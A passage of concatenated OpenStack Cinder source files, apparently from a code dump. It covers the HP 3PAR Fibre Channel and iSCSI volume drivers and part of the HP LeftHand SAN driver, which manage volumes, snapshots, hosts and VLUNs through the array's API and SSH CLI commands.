snapshot.get('volume_id', None)\n            if vol_id:\n                extra['volume_id'] = vol_id\n\n            try:\n                extra['display_name'] = snapshot['display_name']\n            except AttributeError:\n                pass\n\n            try:\n                extra['description'] = snapshot['display_description']\n            except AttributeError:\n                pass\n\n            optional = {'comment': json.dumps(extra),\n                        'readOnly': True}\n            if self.config.hp3par_snapshot_expiration:\n                optional['expirationHours'] = (\n                    self.config.hp3par_snapshot_expiration)\n\n            if self.config.hp3par_snapshot_retention:\n                optional['retentionHours'] = (\n                    self.config.hp3par_snapshot_retention)\n\n            self.client.createSnapshot(snap_name, vol_name, optional)\n        except hpexceptions.HTTPForbidden:\n            raise exception.NotAuthorized()\n        except hpexceptions.HTTPNotFound:\n            raise exception.NotFound()\n\n    def delete_snapshot(self, snapshot):\n        LOG.debug(\"Delete Snapshot\\n%s\" % pprint.pformat(snapshot))\n\n        try:\n            snap_name = self._get_3par_snap_name(snapshot['id'])\n            self.client.deleteVolume(snap_name)\n        except hpexceptions.HTTPForbidden:\n            raise exception.NotAuthorized()\n        except hpexceptions.HTTPNotFound as ex:\n            LOG.error(str(ex))\n\n    def _get_3par_hostname_from_wwn_iqn(self, wwns_iqn):\n        out = self._cli_run(['showhost', '-d'])\n        # wwns_iqn may be a list of strings or a single\n        # string. So, if necessary, create a list to loop.\n        if not isinstance(wwns_iqn, list):\n            wwn_iqn_list = [wwns_iqn]\n        else:\n            wwn_iqn_list = wwns_iqn\n\n        for wwn_iqn in wwn_iqn_list:\n            for showhost in out:\n                if (wwn_iqn.upper() in showhost.upper()):\n                    return showhost.split(',')[1]\n\n    def terminate_connection(self, volume, hostname, wwn_iqn):\n        \"\"\"Driver entry point to unattach a volume from an instance.\"\"\"\n        try:\n            # does 3par know this host by a different name?\n            if hostname in self.hosts_naming_dict:\n                hostname = self.hosts_naming_dict.get(hostname)\n            self.delete_vlun(volume, hostname)\n            return\n        except hpexceptions.HTTPNotFound as e:\n            if 'host does not exist' in e.get_description():\n                # use the wwn to see if we can find the hostname\n                hostname = self._get_3par_hostname_from_wwn_iqn(wwn_iqn)\n                # no 3par host, re-throw\n                if (hostname is None):\n                    raise\n            else:\n            # not a 'host does not exist' HTTPNotFound exception, re-throw\n                raise\n\n        #try again with name retrieved from 3par\n        self.delete_vlun(volume, hostname)\n\n    def parse_create_host_error(self, hostname, out):\n        search_str = \"already used by host \"\n        if search_str in out[1]:\n            #host exists, return name used by 3par\n            hostname_3par = self.get_next_word(out[1], search_str)\n            self.hosts_naming_dict[hostname] = hostname_3par\n            return hostname_3par\n/n/n/ncinder/volume/drivers/san/hp/hp_3par_fc.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4\n#\n#    (c) Copyright 2013 Hewlett-Packard Development Company, L.P.\n#    All Rights Reserved.\n#\n#    Copyright 2012 OpenStack LLC\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n\"\"\"\nVolume driver for HP 3PAR Storage array.\nThis driver requires 3.1.2 MU2 firmware on the 3PAR array.\n\nYou will need to install the python hp3parclient.\nsudo pip install hp3parclient\n\nSet the following in the cinder.conf file to enable the\n3PAR Fibre Channel Driver along with the required flags:\n\nvolume_driver=cinder.volume.drivers.san.hp.hp_3par_fc.HP3PARFCDriver\n\"\"\"\n\nfrom hp3parclient import exceptions as hpexceptions\nfrom oslo.config import cfg\n\nfrom cinder import exception\nfrom cinder.openstack.common import log as logging\nfrom cinder import utils\nimport cinder.volume.driver\nfrom cinder.volume.drivers.san.hp import hp_3par_common as hpcommon\nfrom cinder.volume.drivers.san import san\n\nVERSION = 1.1\nLOG = logging.getLogger(__name__)\n\n\nclass HP3PARFCDriver(cinder.volume.driver.FibreChannelDriver):\n    \"\"\"OpenStack Fibre Channel driver to enable 3PAR storage array.\n\n    Version history:\n        1.0 - Initial driver\n        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,\n              session changes, faster clone, requires 3.1.2 MU2 firmware,\n              copy volume <--> Image.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        super(HP3PARFCDriver, self).__init__(*args, **kwargs)\n        self.common = None\n        self.configuration.append_config_values(hpcommon.hp3par_opts)\n        self.configuration.append_config_values(san.san_opts)\n\n    def _init_common(self):\n        return hpcommon.HP3PARCommon(self.configuration)\n\n    def _check_flags(self):\n        \"\"\"Sanity check to ensure we have required options set.\"\"\"\n        required_flags = ['hp3par_api_url', 'hp3par_username',\n                          'hp3par_password',\n                          'san_ip', 'san_login', 'san_password']\n        self.common.check_flags(self.configuration, required_flags)\n\n    @utils.synchronized('3par', external=True)\n    def get_volume_stats(self, refresh):\n        self.common.client_login()\n        stats = self.common.get_volume_stats(refresh)\n        stats['storage_protocol'] = 'FC'\n        backend_name = self.configuration.safe_get('volume_backend_name')\n        stats['volume_backend_name'] = backend_name or self.__class__.__name__\n        self.common.client_logout()\n        return stats\n\n    def do_setup(self, context):\n        self.common = self._init_common()\n        self._check_flags()\n        self.common.do_setup(context)\n\n    def check_for_setup_error(self):\n        \"\"\"Returns an error if prerequisites aren't met.\"\"\"\n        self._check_flags()\n\n    @utils.synchronized('3par', external=True)\n    def create_volume(self, volume):\n        self.common.client_login()\n        metadata = self.common.create_volume(volume)\n        self.common.client_logout()\n        return {'metadata': metadata}\n\n    @utils.synchronized('3par', external=True)\n    def create_cloned_volume(self, volume, src_vref):\n        self.common.client_login()\n        new_vol = self.common.create_cloned_volume(volume, src_vref)\n        self.common.client_logout()\n        return {'metadata': new_vol}\n\n    @utils.synchronized('3par', external=True)\n    def delete_volume(self, volume):\n        self.common.client_login()\n        self.common.delete_volume(volume)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def create_volume_from_snapshot(self, volume, snapshot):\n        \"\"\"\n        Creates a volume from a snapshot.\n\n        TODO: support using the size from the user.\n        \"\"\"\n        self.common.client_login()\n        metadata = self.common.create_volume_from_snapshot(volume, snapshot)\n        self.common.client_logout()\n        return {'metadata': metadata}\n\n    @utils.synchronized('3par', external=True)\n    def create_snapshot(self, snapshot):\n        self.common.client_login()\n        self.common.create_snapshot(snapshot)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def delete_snapshot(self, snapshot):\n        self.common.client_login()\n        self.common.delete_snapshot(snapshot)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def initialize_connection(self, volume, connector):\n        \"\"\"Assigns the volume to a server.\n\n        Assign any created volume to a compute node/host so that it can be\n        used from that host.\n\n        The  driver returns a driver_volume_type of 'fibre_channel'.\n        The target_wwn can be a single entry or a list of wwns that\n        correspond to the list of remote wwn(s) that will export the volume.\n        Example return values:\n\n            {\n                'driver_volume_type': 'fibre_channel'\n                'data': {\n                    'target_discovered': True,\n                    'target_lun': 1,\n                    'target_wwn': '1234567890123',\n                }\n            }\n\n            or\n\n             {\n                'driver_volume_type': 'fibre_channel'\n                'data': {\n                    'target_discovered': True,\n                    'target_lun': 1,\n                    'target_wwn': ['1234567890123', '0987654321321'],\n                }\n            }\n\n\n        Steps to export a volume on 3PAR\n          * Create a host on the 3par with the target wwn\n          * Create a VLUN for that HOST with the volume we want to export.\n\n        \"\"\"\n        self.common.client_login()\n        # we have to make sure we have a host\n        host = self._create_host(volume, connector)\n\n        # now that we have a host, create the VLUN\n        vlun = self.common.create_vlun(volume, host)\n\n        ports = self.common.get_ports()\n\n        self.common.client_logout()\n        info = {'driver_volume_type': 'fibre_channel',\n                'data': {'target_lun': vlun['lun'],\n                         'target_discovered': True,\n                         'target_wwn': ports['FC']}}\n        return info\n\n    @utils.synchronized('3par', external=True)\n    def terminate_connection(self, volume, connector, **kwargs):\n        \"\"\"Driver entry point to unattach a volume from an instance.\"\"\"\n        self.common.client_login()\n        self.common.terminate_connection(volume,\n                                         connector['host'],\n                                         connector['wwpns'])\n        self.common.client_logout()\n\n    def _create_3par_fibrechan_host(self, hostname, wwns, domain, persona_id):\n        \"\"\"Create a 3PAR host.\n\n        Create a 3PAR host, if there is already a host on the 3par using\n        the same wwn but with a different hostname, return the hostname\n        used by 3PAR.\n        \"\"\"\n        command = ['createhost', '-persona', persona_id, '-domain', domain,\n                   hostname]\n        for wwn in wwns:\n            command.append(wwn)\n\n        out = self.common._cli_run(command)\n        if out and len(out) > 1:\n            return self.common.parse_create_host_error(hostname, out)\n\n        return hostname\n\n    def _modify_3par_fibrechan_host(self, hostname, wwns):\n        # when using -add, you can not send the persona or domain options\n        command = ['createhost', '-add', hostname]\n        for wwn in wwns:\n            command.append(wwn)\n\n        out = self.common._cli_run(command)\n\n    def _create_host(self, volume, connector):\n        \"\"\"Creates or modifies existing 3PAR host.\"\"\"\n        host = None\n        hostname = self.common._safe_hostname(connector['host'])\n        cpg = self.common.get_cpg(volume, allowSnap=True)\n        domain = self.common.get_domain(cpg)\n        try:\n            host = self.common._get_3par_host(hostname)\n            if not host['FCPaths']:\n                self._modify_3par_fibrechan_host(hostname, connector['wwpns'])\n                host = self.common._get_3par_host(hostname)\n        except hpexceptions.HTTPNotFound as ex:\n            # get persona from the volume type extra specs\n            persona_id = self.common.get_persona_type(volume)\n            # host doesn't exist, we have to create it\n            hostname = self._create_3par_fibrechan_host(hostname,\n                                                        connector['wwpns'],\n                                                        domain,\n                                                        persona_id)\n            host = self.common._get_3par_host(hostname)\n\n        return host\n\n    @utils.synchronized('3par', external=True)\n    def create_export(self, context, volume):\n        pass\n\n    @utils.synchronized('3par', external=True)\n    def ensure_export(self, context, volume):\n        pass\n\n    @utils.synchronized('3par', external=True)\n    def remove_export(self, context, volume):\n        pass\n\n    def extend_volume(self, volume, new_size):\n        self.common.extend_volume(volume, new_size)\n/n/n/ncinder/volume/drivers/san/hp/hp_3par_iscsi.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4\n#\n#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.\n#    All Rights Reserved.\n#\n#    Copyright 2012 OpenStack LLC\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n\"\"\"\nVolume driver for HP 3PAR Storage array.\nThis driver requires 3.1.2 MU2 firmware on the 3PAR array.\n\nYou will need to install the python hp3parclient.\nsudo pip install hp3parclient\n\nSet the following in the cinder.conf file to enable the\n3PAR iSCSI Driver along with the required flags:\n\nvolume_driver=cinder.volume.drivers.san.hp.hp_3par_iscsi.HP3PARISCSIDriver\n\"\"\"\n\nimport sys\n\nfrom hp3parclient import exceptions as hpexceptions\n\nfrom cinder import exception\nfrom cinder.openstack.common import log as logging\nfrom cinder import utils\nimport cinder.volume.driver\nfrom cinder.volume.drivers.san.hp import hp_3par_common as hpcommon\nfrom cinder.volume.drivers.san import san\n\nVERSION = 1.1\nLOG = logging.getLogger(__name__)\nDEFAULT_ISCSI_PORT = 3260\n\n\nclass HP3PARISCSIDriver(cinder.volume.driver.ISCSIDriver):\n    \"\"\"OpenStack iSCSI driver to enable 3PAR storage array.\n\n    Version history:\n        1.0 - Initial driver\n        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,\n              session changes, faster clone, requires 3.1.2 MU2 firmware.\n\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        super(HP3PARISCSIDriver, self).__init__(*args, **kwargs)\n        self.common = None\n        self.configuration.append_config_values(hpcommon.hp3par_opts)\n        self.configuration.append_config_values(san.san_opts)\n\n    def _init_common(self):\n        return hpcommon.HP3PARCommon(self.configuration)\n\n    def _check_flags(self):\n        \"\"\"Sanity check to ensure we have required options set.\"\"\"\n        required_flags = ['hp3par_api_url', 'hp3par_username',\n                          'hp3par_password', 'san_ip', 'san_login',\n                          'san_password']\n        self.common.check_flags(self.configuration, required_flags)\n\n    @utils.synchronized('3par', external=True)\n    def get_volume_stats(self, refresh):\n        self.common.client_login()\n        stats = self.common.get_volume_stats(refresh)\n        stats['storage_protocol'] = 'iSCSI'\n        backend_name = self.configuration.safe_get('volume_backend_name')\n        stats['volume_backend_name'] = backend_name or self.__class__.__name__\n        self.common.client_logout()\n        return stats\n\n    def do_setup(self, context):\n        self.common = self._init_common()\n        self._check_flags()\n\n        # map iscsi_ip-> ip_port\n        #             -> iqn\n        #             -> nsp\n        self.iscsi_ips = {}\n        temp_iscsi_ip = {}\n\n        # use the 3PAR ip_addr list for iSCSI configuration\n        if len(self.configuration.hp3par_iscsi_ips) > 0:\n            # add port values to ip_addr, if necessary\n            for ip_addr in self.configuration.hp3par_iscsi_ips:\n                ip = ip_addr.split(':')\n                if len(ip) == 1:\n                    temp_iscsi_ip[ip_addr] = {'ip_port': DEFAULT_ISCSI_PORT}\n                elif len(ip) == 2:\n                    temp_iscsi_ip[ip[0]] = {'ip_port': ip[1]}\n                else:\n                    msg = _(\"Invalid IP address format '%s'\") % ip_addr\n                    LOG.warn(msg)\n\n        # add the single value iscsi_ip_address option to the IP dictionary.\n        # This way we can see if it's a valid iSCSI IP. If it's not valid,\n        # we won't use it and won't bother to report it, see below\n        if (self.configuration.iscsi_ip_address not in temp_iscsi_ip):\n            ip = self.configuration.iscsi_ip_address\n            ip_port = self.configuration.iscsi_port\n            temp_iscsi_ip[ip] = {'ip_port': ip_port}\n\n        # get all the valid iSCSI ports from 3PAR\n        # when found, add the valid iSCSI ip, ip port, iqn and nsp\n        # to the iSCSI IP dictionary\n        # ...this will also make sure ssh works.\n        iscsi_ports = self.common.get_ports()['iSCSI']\n        for (ip, iscsi_info) in iscsi_ports.iteritems():\n            if ip in temp_iscsi_ip:\n                ip_port = temp_iscsi_ip[ip]['ip_port']\n                self.iscsi_ips[ip] = {'ip_port': ip_port,\n                                      'nsp': iscsi_info['nsp'],\n                                      'iqn': iscsi_info['iqn']\n                                      }\n                del temp_iscsi_ip[ip]\n\n        # if the single value iscsi_ip_address option is still in the\n        # temp dictionary it's because it defaults to $my_ip which doesn't\n        # make sense in this context. So, if present, remove it and move on.\n        if (self.configuration.iscsi_ip_address in temp_iscsi_ip):\n            del temp_iscsi_ip[self.configuration.iscsi_ip_address]\n\n        # lets see if there are invalid iSCSI IPs left in the temp dict\n        if len(temp_iscsi_ip) > 0:\n            msg = _(\"Found invalid iSCSI IP address(s) in configuration \"\n                    \"option(s) hp3par_iscsi_ips or iscsi_ip_address '%s.'\") % \\\n                   (\", \".join(temp_iscsi_ip))\n            LOG.warn(msg)\n\n        if not len(self.iscsi_ips) > 0:\n            msg = _('At least one valid iSCSI IP address must be set.')\n            raise exception.InvalidInput(reason=(msg))\n\n        self.common.do_setup(context)\n\n    def check_for_setup_error(self):\n        \"\"\"Returns an error if prerequisites aren't met.\"\"\"\n        self._check_flags()\n\n    @utils.synchronized('3par', external=True)\n    def create_volume(self, volume):\n        self.common.client_login()\n        metadata = self.common.create_volume(volume)\n        self.common.client_logout()\n\n        return {'metadata': metadata}\n\n    @utils.synchronized('3par', external=True)\n    def create_cloned_volume(self, volume, src_vref):\n        \"\"\"Clone an existing volume.\"\"\"\n        self.common.client_login()\n        new_vol = self.common.create_cloned_volume(volume, src_vref)\n        self.common.client_logout()\n\n        return {'metadata': new_vol}\n\n    @utils.synchronized('3par', external=True)\n    def delete_volume(self, volume):\n        self.common.client_login()\n        self.common.delete_volume(volume)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def create_volume_from_snapshot(self, volume, snapshot):\n        \"\"\"\n        Creates a volume from a snapshot.\n\n        TODO: support using the size from the user.\n        \"\"\"\n        self.common.client_login()\n        metadata = self.common.create_volume_from_snapshot(volume, snapshot)\n        self.common.client_logout()\n        return {'metadata': metadata}\n\n    @utils.synchronized('3par', external=True)\n    def create_snapshot(self, snapshot):\n        self.common.client_login()\n        self.common.create_snapshot(snapshot)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def delete_snapshot(self, snapshot):\n        self.common.client_login()\n        self.common.delete_snapshot(snapshot)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def initialize_connection(self, volume, connector):\n        \"\"\"Assigns the volume to a server.\n\n        Assign any created volume to a compute node/host so that it can be\n        used from that host.\n\n        This driver returns a driver_volume_type of 'iscsi'.\n        The format of the driver data is defined in _get_iscsi_properties.\n        Example return value:\n\n            {\n                'driver_volume_type': 'iscsi'\n                'data': {\n                    'target_discovered': True,\n                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',\n                    'target_protal': '127.0.0.1:3260',\n                    'volume_id': 1,\n                }\n            }\n\n        Steps to export a volume on 3PAR\n          * Get the 3PAR iSCSI iqn\n          * Create a host on the 3par\n          * create vlun on the 3par\n        \"\"\"\n        self.common.client_login()\n\n        # we have to make sure we have a host\n        host = self._create_host(volume, connector)\n\n        # now that we have a host, create the VLUN\n        vlun = self.common.create_vlun(volume, host)\n\n        self.common.client_logout()\n\n        iscsi_ip = self._get_iscsi_ip(host['name'])\n        iscsi_ip_port = self.iscsi_ips[iscsi_ip]['ip_port']\n        iscsi_target_iqn = self.iscsi_ips[iscsi_ip]['iqn']\n        info = {'driver_volume_type': 'iscsi',\n                'data': {'target_portal': \"%s:%s\" %\n                         (iscsi_ip, iscsi_ip_port),\n                         'target_iqn': iscsi_target_iqn,\n                         'target_lun': vlun['lun'],\n                         'target_discovered': True\n                         }\n                }\n        return info\n\n    @utils.synchronized('3par', external=True)\n    def terminate_connection(self, volume, connector, **kwargs):\n        \"\"\"Driver entry point to unattach a volume from an instance.\"\"\"\n        self.common.client_login()\n        self.common.terminate_connection(volume,\n                                         connector['host'],\n                                         connector['initiator'])\n        self.common.client_logout()\n\n    def _create_3par_iscsi_host(self, hostname, iscsi_iqn, domain, persona_id):\n        \"\"\"Create a 3PAR host.\n\n        Create a 3PAR host, if there is already a host on the 3par using\n        the same iqn but with a different hostname, return the hostname\n        used by 3PAR.\n        \"\"\"\n        cmd = ['createhost', '-iscsi', '-persona', persona_id, '-domain',\n               domain, hostname, iscsi_iqn]\n        out = self.common._cli_run(cmd)\n        if out and len(out) > 1:\n            return self.common.parse_create_host_error(hostname, out)\n        return hostname\n\n    def _modify_3par_iscsi_host(self, hostname, iscsi_iqn):\n        # when using -add, you can not send the persona or domain options\n        command = ['createhost', '-iscsi', '-add', hostname, iscsi_iqn]\n        self.common._cli_run(command)\n\n    def _create_host(self, volume, connector):\n        \"\"\"Creates or modifies existing 3PAR host.\"\"\"\n        # make sure we don't have the host already\n        host = None\n        hostname = self.common._safe_hostname(connector['host'])\n        cpg = self.common.get_cpg(volume, allowSnap=True)\n        domain = self.common.get_domain(cpg)\n        try:\n            host = self.common._get_3par_host(hostname)\n            if not host['iSCSIPaths']:\n                self._modify_3par_iscsi_host(hostname, connector['initiator'])\n                host = self.common._get_3par_host(hostname)\n        except hpexceptions.HTTPNotFound:\n            # get persona from the volume type extra specs\n            persona_id = self.common.get_persona_type(volume)\n            # host doesn't exist, we have to create it\n            hostname = self._create_3par_iscsi_host(hostname,\n                                                    connector['initiator'],\n                                                    domain,\n                                                    persona_id)\n            host = self.common._get_3par_host(hostname)\n\n        return host\n\n    @utils.synchronized('3par', external=True)\n    def create_export(self, context, volume):\n        pass\n\n    @utils.synchronized('3par', external=True)\n    def ensure_export(self, context, volume):\n        pass\n\n    @utils.synchronized('3par', external=True)\n    def remove_export(self, context, volume):\n        pass\n\n    def _get_iscsi_ip(self, hostname):\n        \"\"\"Get an iSCSI IP address to use.\n\n        Steps to determine which IP address to use.\n          * If only one IP address, return it\n          * If there is an active vlun, return the IP associated with it\n          * Return IP with fewest active vluns\n        \"\"\"\n        if len(self.iscsi_ips) == 1:\n            return self.iscsi_ips.keys()[0]\n\n        # if we currently have an active port, use it\n        nsp = self._get_active_nsp(hostname)\n\n        if nsp is None:\n            # no active vlun, find least busy port\n            nsp = self._get_least_used_nsp(self._get_iscsi_nsps())\n            if nsp is None:\n                msg = _(\"Least busy iSCSI port not found, \"\n                        \"using first iSCSI port in list.\")\n                LOG.warn(msg)\n                return self.iscsi_ips.keys()[0]\n\n        return self._get_ip_using_nsp(nsp)\n\n    def _get_iscsi_nsps(self):\n        \"\"\"Return the list of candidate nsps.\"\"\"\n        nsps = []\n        for value in self.iscsi_ips.values():\n            nsps.append(value['nsp'])\n        return nsps\n\n    def _get_ip_using_nsp(self, nsp):\n        \"\"\"Return IP assiciated with given nsp.\"\"\"\n        for (key, value) in self.iscsi_ips.items():\n            if value['nsp'] == nsp:\n                return key\n\n    def _get_active_nsp(self, hostname):\n        \"\"\"Return the active nsp, if one exists, for the given host.\"\"\"\n        result = self.common._cli_run(['showvlun', '-a', '-host', hostname])\n        if result:\n            # first line is header\n            result = result[1:]\n            for line in result:\n                info = line.split(\",\")\n                if info and len(info) > 4:\n                    return info[4]\n\n    def _get_least_used_nsp(self, nspss):\n        \"\"\"\"Return the nsp that has the fewest active vluns.\"\"\"\n        # return only the nsp (node:server:port)\n        result = self.common._cli_run(['showvlun', '-a', '-showcols', 'Port'])\n\n        # count the number of nsps (there is 1 for each active vlun)\n        nsp_counts = {}\n        for nsp in nspss:\n            # initialize counts to zero\n            nsp_counts[nsp] = 0\n\n        current_least_used_nsp = None\n        if result:\n            # first line is header\n            result = result[1:]\n            for line in result:\n                nsp = line.strip()\n                if nsp in nsp_counts:\n                    nsp_counts[nsp] = nsp_counts[nsp] + 1\n\n            # identify key (nsp) of least used nsp\n            current_smallest_count = sys.maxint\n            for (nsp, count) in nsp_counts.iteritems():\n                if count < current_smallest_count:\n                    current_least_used_nsp = nsp\n                    current_smallest_count = count\n\n        return current_least_used_nsp\n\n    def extend_volume(self, volume, new_size):\n        self.common.extend_volume(volume, new_size)\n/n/n/ncinder/volume/drivers/san/hp_lefthand.py/n/n#    Copyright 2012 OpenStack LLC\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\"\"\"\nHP Lefthand SAN ISCSI Driver.\n\nThe driver communicates to the backend aka Cliq via SSH to perform all the\noperations on the SAN.\n\"\"\"\nfrom lxml import etree\n\nfrom cinder import exception\nfrom cinder.openstack.common import log as logging\nfrom cinder.volume.drivers.san.san import SanISCSIDriver\n\n\nLOG = logging.getLogger(__name__)\n\n\nclass HpSanISCSIDriver(SanISCSIDriver):\n    \"\"\"Executes commands relating to HP/Lefthand SAN ISCSI volumes.\n\n    We use the CLIQ interface, over SSH.\n\n    Rough overview of CLIQ commands used:\n\n    :createVolume:    (creates the volume)\n\n    :getVolumeInfo:    (to discover the IQN etc)\n\n    :getClusterInfo:    (to discover the iSCSI target IP address)\n\n    :assignVolumeChap:    (exports it with CHAP security)\n\n    The 'trick' here is that the HP SAN enforces security by default, so\n    normally a volume mount would need both to configure the SAN in the volume\n    layer and do the mount on the compute layer.  Multi-layer operations are\n    not catered for at the moment in the cinder architecture, so instead we\n    share the volume using CHAP at volume creation time.  Then the mount need\n    only use those CHAP credentials, so can take place exclusively in the\n    compute layer.\n    \"\"\"\n\n    device_stats = {}\n\n    def __init__(self, *args, **kwargs):\n        super(HpSanISCSIDriver, self).__init__(*args, **kwargs)\n        self.cluster_vip = None\n\n    def _cliq_run(self, verb, cliq_args, check_exit_code=True):\n        \"\"\"Runs a CLIQ command over SSH, without doing any result parsing\"\"\"\n        cmd_list = [verb]\n        for k, v in cliq_args.items():\n            cmd_list.append(\"%s=%s\" % (k, v))\n\n        return self._run_ssh(cmd_list, check_exit_code)\n\n    def _cliq_run_xml(self, verb, cliq_args, check_cliq_result=True):\n        \"\"\"Runs a CLIQ command over SSH, parsing and checking the output\"\"\"\n        cliq_args['output'] = 'XML'\n        (out, _err) = self._cliq_run(verb, cliq_args, check_cliq_result)\n\n        LOG.debug(_(\"CLIQ command returned %s\"), out)\n\n        result_xml = etree.fromstring(out)\n        if check_cliq_result:\n            response_node = result_xml.find(\"response\")\n            if response_node is None:\n                msg = (_(\"Malformed response to CLIQ command \"\n                         \"%(verb)s %(cliq_args)s. Result=%(out)s\") %\n                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})\n                raise exception.VolumeBackendAPIException(data=msg)\n\n            result_code = response_node.attrib.get(\"result\")\n\n            if result_code != \"0\":\n                msg = (_(\"Error running CLIQ command %(verb)s %(cliq_args)s. \"\n                         \" Result=%(out)s\") %\n                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})\n                raise exception.VolumeBackendAPIException(data=msg)\n\n        return result_xml\n\n    def _cliq_get_cluster_info(self, cluster_name):\n        \"\"\"Queries for info about the cluster (including IP)\"\"\"\n        cliq_args = {}\n        cliq_args['clusterName'] = cluster_name\n        cliq_args['searchDepth'] = '1'\n        cliq_args['verbose'] = '0'\n\n        result_xml = self._cliq_run_xml(\"getClusterInfo\", cliq_args)\n\n        return result_xml\n\n    def _cliq_get_cluster_vip(self, cluster_name):\n        \"\"\"Gets the IP on which a cluster shares iSCSI volumes\"\"\"\n        cluster_xml = self._cliq_get_cluster_info(cluster_name)\n\n        vips = []\n        for vip in cluster_xml.findall(\"response/cluster/vip\"):\n            vips.append(vip.attrib.get('ipAddress'))\n\n        if len(vips) == 1:\n            return vips[0]\n\n        _xml = etree.tostring(cluster_xml)\n        msg = (_(\"Unexpected number of virtual ips for cluster \"\n                 \" %(cluster_name)s. Result=%(_xml)s\") %\n               {'cluster_name': cluster_name, '_xml': _xml})\n        raise exception.VolumeBackendAPIException(data=msg)\n\n    def _cliq_get_volume_info(self, volume_name):\n        \"\"\"Gets the volume info, including IQN\"\"\"\n        cliq_args = {}\n        cliq_args['volumeName'] = volume_name\n        result_xml = self._cliq_run_xml(\"getVolumeInfo\", cliq_args)\n\n        # Result looks like this:\n        #<gauche version=\"1.0\">\n        #  <response description=\"Operation succeeded.\" name=\"CliqSuccess\"\n        #            processingTime=\"87\" result=\"0\">\n        #    <volume autogrowPages=\"4\" availability=\"online\" blockSize=\"1024\"\n        #       bytesWritten=\"0\" checkSum=\"false\" clusterName=\"Cluster01\"\n        #       created=\"2011-02-08T19:56:53Z\" deleting=\"false\" description=\"\"\n        #       groupName=\"Group01\" initialQuota=\"536870912\" isPrimary=\"true\"\n        #       iscsiIqn=\"iqn.2003-10.com.lefthandnetworks:group01:25366:vol-b\"\n        #       maxSize=\"6865387257856\" md5=\"9fa5c8b2cca54b2948a63d833097e1ca\"\n        #       minReplication=\"1\" name=\"vol-b\" parity=\"0\" replication=\"2\"\n        #       reserveQuota=\"536870912\" scratchQuota=\"4194304\"\n        #       serialNumber=\"9fa5c8b2cca54b2948a63d833097e1ca0000000000006316\"\n        #       size=\"1073741824\" stridePages=\"32\" thinProvision=\"true\">\n        #      <status description=\"OK\" value=\"2\"/>\n        #      <permission access=\"rw\"\n        #            authGroup=\"api-34281B815713B78-(trimmed)51ADD4B7030853AA7\"\n        #            chapName=\"chapusername\" chapRequired=\"true\" id=\"25369\"\n        #            initiatorSecret=\"\" iqn=\"\" iscsiEnabled=\"true\"\n        #            loadBalance=\"true\" targetSecret=\"supersecret\"/>\n        #    </volume>\n        #  </response>\n        #</gauche>\n\n        # Flatten the nodes into a dictionary; use prefixes to avoid collisions\n        volume_attributes = {}\n\n        volume_node = result_xml.find(\"response/volume\")\n        for k, v in volume_node.attrib.items():\n            volume_attributes[\"volume.\" + k] = v\n\n        status_node = volume_node.find(\"status\")\n        if status_node is not None:\n            for k, v in status_node.attrib.items():\n                volume_attributes[\"status.\" + k] = v\n\n        # We only consider the first permission node\n        permission_node = volume_node.find(\"permission\")\n        if permission_node is not None:\n            for k, v in status_node.attrib.items():\n                volume_attributes[\"permission.\" + k] = v\n\n        LOG.debug(_(\"Volume info: %(volume_name)s => %(volume_attributes)s\") %\n                  {'volume_name': volume_name,\n                   'volume_attributes': volume_attributes})\n        return volume_attributes\n\n    def create_volume(self, volume):\n        \"\"\"Creates a volume.\"\"\"\n        cliq_args = {}\n        cliq_args['clusterName'] = self.configuration.san_clustername\n\n        if self.configuration.san_thin_provision:\n            cliq_args['thinProvision'] = '1'\n        else:\n            cliq_args['thinProvision'] = '0'\n\n        cliq_args['volumeName'] = volume['name']\n        if int(volume['size']) == 0:\n            cliq_args['size'] = '100MB'\n        else:\n            cliq_args['size'] = '%sGB' % volume['size']\n\n        self._cliq_run_xml(\"createVolume\", cliq_args)\n\n        volume_info = self._cliq_get_volume_info(volume['name'])\n        cluster_name = volume_info['volume.clusterName']\n        iscsi_iqn = volume_info['volume.iscsiIqn']\n\n        #TODO(justinsb): Is this always 1? Does it matter?\n        cluster_interface = '1'\n\n        if not self.cluster_vip:\n            self.cluster_vip = self._cliq_get_cluster_vip(cluster_name)\n        iscsi_portal = self.cluster_vip + \":3260,\" + cluster_interface\n\n        model_update = {}\n\n        # NOTE(jdg): LH volumes always at lun 0 ?\n        model_update['provider_location'] = (\"%s %s %s\" %\n                                             (iscsi_portal,\n                                       